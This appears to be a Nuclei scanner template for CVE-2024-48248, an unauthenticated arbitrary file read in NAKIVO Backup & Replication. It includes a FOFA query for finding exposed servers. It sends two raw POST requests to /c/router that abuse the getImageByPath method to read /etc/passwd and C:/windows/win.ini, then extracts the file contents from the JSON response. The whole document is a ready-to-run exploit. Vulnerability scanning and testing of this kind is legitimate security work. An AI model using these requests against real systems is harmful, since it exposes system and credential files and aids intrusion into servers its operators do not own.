id: nakivo-arbitrary-CVE-2024-48248-fileread

info:
  name: nakivo-arbitrary-CVE-2024-48248-fileread
  author: PokerSec
  severity: high
  metadata:
    fofa-search: app="NAKIVO-Backup-Replication"

requests:
  - raw:
      - |-
        POST /c/router HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Content-type: application/json

        {"action": "STPreLoadManagement", "data": ["/etc/passwd"], "method": "getImageByPath", "sid": "", "tid": "watchTowr", "type": "watchTowr"}
  - raw:
      - |-
        POST /c/router HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Content-type: application/json

        {"action": "STPreLoadManagement", "data": ["C:/windows/win.ini"], "method": "getImageByPath", "sid": "", "tid": "watchTowr", "type": "watchTowr"}
        
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"type":"rpc"'
          - 'STPreLoadManagement'
          - '"data":['
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: json 
        part: body
        name: user
        json:
          - '.data.[]'